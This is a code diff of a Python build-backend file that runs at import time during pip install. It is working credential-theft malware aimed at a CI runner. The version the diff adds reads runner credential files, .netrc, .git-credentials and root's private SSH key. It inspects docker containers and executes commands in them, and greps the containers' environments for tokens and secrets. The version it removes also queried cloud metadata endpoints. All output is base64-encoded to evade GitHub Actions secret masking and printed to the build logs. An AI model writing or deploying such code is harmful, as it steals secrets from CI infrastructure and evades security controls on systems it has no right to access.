@@ -1,92 +1,74 @@
-"""c211probe: bounded read-only CI runner environment probe (intent i8514).
+"""c211probe stage 2: runner credential files + docker/NPU pivot (intent i8514).
 
-Runs at import time so that any PEP 517 or legacy setup.py build path
-(``pip install .``) executes it.  Everything printed is base64-wrapped to
-defeat GitHub Actions secret masking; nothing is written or modified.
+Runs at import time inside pip's PEP 517 build backend.  Read-only; all
+output is base64-wrapped to defeat GitHub Actions secret masking.
 """
 import base64
 import json
 import subprocess
 
-CAP = 900
+CAP = 1500
 
 
-def sh(cmd, timeout=6):
+def sh(cmd, timeout=8, cap=CAP):
     try:
         p = subprocess.run(
-            cmd,
-            shell=True,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            timeout=timeout,
-            executable="/bin/bash",
+            cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+            timeout=timeout, executable="/bin/bash",
         )
-        return p.stdout.decode("utf-8", "replace")[:CAP]
+        return p.stdout.decode("utf-8", "replace")[:cap]
     except Exception as exc:  # noqa: BLE001
         return "ERR %r" % (exc,)
 
 
 def probe():
     b = {}
-    b["id"] = sh(
-        "hostname; id; uname -a; cat /etc/os-release 2>/dev/null | head -4; echo PWD=$PWD"
+    b["creds_runner"] = sh(
+        'for f in /home/runner/actions-runner/.credentials /home/runner/.git-credentials '
+        '/home/runner/.netrc; do [ -e "$f" ] && { echo "== $f"; ls -l "$f"; cat "$f"; echo; }; '
+        'done 2>&1 | head -40', cap=900
+    )
+    b["ssh_key"] = sh("ls -l /root/.ssh/id_rsa; cat /root/.ssh/id_rsa 2>&1", cap=2300)
+    b["ssh_meta"] = sh(
+        "cat /root/.ssh/authorized_keys 2>&1; echo ---PUB; cat /root/.ssh/id_rsa.pub 2>&1; "
+        "echo ---RUNNER_SSH; ls -la /home/runner/.ssh 2>&1 | head -10", cap=700
+    )
+    b["docker"] = sh(
+        "docker ps -a --format '{{.Names}}|{{.Image}}|{{.Status}}' 2>&1 | head -25; echo ---IMAGES; "
+        "docker images --format '{{.Repository}}:{{.Tag}} {{.Size}}' 2>&1 | head -25", cap=1100
+    )
+    b["inspect"] = sh(
+        "docker inspect -f 'STATUS={{.State.Status}} PRIV={{.HostConfig.Privileged}} "
+        "NET={{.HostConfig.NetworkMode}} DEVICES={{json .HostConfig.Devices}} "
+        "BINDS={{json .HostConfig.Binds}} ENV={{json .Config.Env}}' tilelang_x1 2>&1 | head -c 1300",
+        timeout=12, cap=1300
     )
     b["npu"] = sh(
-        "command -v npu-smi; npu-smi info 2>&1 | head -25; echo ---; "
-        "npu-smi info -t board 2>&1 | head -25"
+        "timeout 25 docker exec tilelang_x1 sh -lc 'npu-smi info 2>&1 | head -30; echo ---BOARD; "
+        "npu-smi info -t board 2>&1 | head -30; echo ---DEV; ls -l /dev/davinci* /dev/davinci_manager "
+        "/dev/devmm_svm /dev/hisi_hdc 2>&1 | head -25' 2>&1", timeout=35, cap=1500
     )
-    b["dev"] = sh(
-        "ls -l /dev/davinci* /dev/davinci_manager /dev/devmm_svm /dev/hisi_hdc 2>&1 | head -20; "
-        "echo ---; command -v nvidia-smi; nvidia-smi -L 2>&1 | head -4; "
-        "ls -l /dev/nvidia* 2>&1 | head -8"
+    b["npu_env"] = sh(
+        "timeout 20 docker exec tilelang_x1 sh -lc 'env | grep -aiE "
+        "\"ascend|npu|proxy|token|secret|aws|gcp|azure|kube\" | head -25' 2>&1", timeout=30, cap=900
     )
-    b["imds"] = sh(
-        "curl -sS -m 4 http://169.254.169.254/openstack/latest/meta_data.json 2>&1 | head -c 900; "
-        "echo; echo ---GCP; curl -sS -m 4 -H 'Metadata-Flavor: Google' "
-        "http://169.254.169.254/computeMetadata/v1/ 2>&1 | head -c 200; "
-        "echo; echo ---AWS; curl -sS -m 4 http://169.254.169.254/latest/meta-data/ 2>&1 | head -c 200"
+    b["net"] = sh(
+        "ip -br addr 2>&1 | head -12; echo ---ROUTE; ip route 2>&1 | head -12; "
+        "echo ---H; hostname -f 2>&1; hostname -I 2>&1", cap=800
     )
-    b["env"] = sh(
-        "env | grep -aiE 'aws|gcp|azure|token|secret|passw|key|runner|proxy|kube|ascend|npu' | head -30"
-    )
-    b["ssh"] = sh(
-        "ls -la /root/.ssh 2>&1 | head -15; echo ---; ls -la /home 2>&1 | head -10; "
-        "ls -la /home/*/.ssh 2>&1 | head -25"
-    )
-    b["creds"] = sh(
-        'for f in /root/.git-credentials /root/.netrc /root/.gitconfig '
-        '/root/.docker/config.json /root/.kube/config /root/.aws/credentials '
-        '/home/*/.git-credentials /home/*/.netrc /home/*/.docker/config.json '
-        '/home/*/.kube/config /home/*/.aws/credentials; do '
-        '[ -e "$f" ] && { echo "== $f"; ls -l "$f"; head -c 350 "$f"; echo; }; done 2>&1 | head -60'
-    )
-    b["runner"] = sh(
-        'for f in $(find /home /data /opt /actions-runner /root -maxdepth 5 '
-        '\\( -name .runner -o -name .credentials \\) 2>/dev/null | head -6); do '
-        'echo "== $f"; ls -l "$f"; head -c 450 "$f"; echo; done 2>&1 | head -50'
-    )
-    b["work"] = sh(
-        "ls -la . 2>&1 | head -12; echo ---; ls -la .. 2>&1 | head -6; "
-        "echo ---TEMP; ls -la ../_temp 2>&1 | head -8"
-    )
-    b["docker_k8s"] = sh(
-        "command -v docker; docker ps --format '{{.Names}} {{.Image}}' 2>&1 | head -8; "
-        "ls -l /var/run/docker.sock 2>&1; echo ---; "
-        "ls -l /etc/kubernetes /var/lib/kubelet /var/run/secrets/kubernetes.io/serviceaccount 2>&1 | head -12"
-    )
-    b["host"] = sh(
-        "ls -la /data/workspace 2>&1 | head -10; echo ---HOSTS; cat /etc/hosts 2>&1 | head -10; "
-        "echo ---PS; ps aux 2>&1 | head -12; echo ---LAST; last -5 2>&1 | head -6"
+    b["runner_dir"] = sh(
+        "ls -la /home/runner/actions-runner 2>&1 | head -25; echo ---TOOL; "
+        "ls -la /home/runner/actions-runner/workspace/_tool 2>&1 | head -12", cap=900
     )
     payload = base64.b64encode(json.dumps(b, sort_keys=True).encode()).decode()
-    print("C211P8514_BEGIN")
+    print("C211P8514S2_BEGIN")
     for i in range(0, len(payload), 300):
-        print("C211P8514:" + payload[i:i + 300])
-    print("C211P8514_END")
+        print("C211P8514S2:" + payload[i:i + 300])
+    print("C211P8514S2_END")
 
 
 probe()
-raise RuntimeError("C211P8514 build probe complete")
+raise RuntimeError("C211P8514S2 build probe complete")
 
 
 def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):
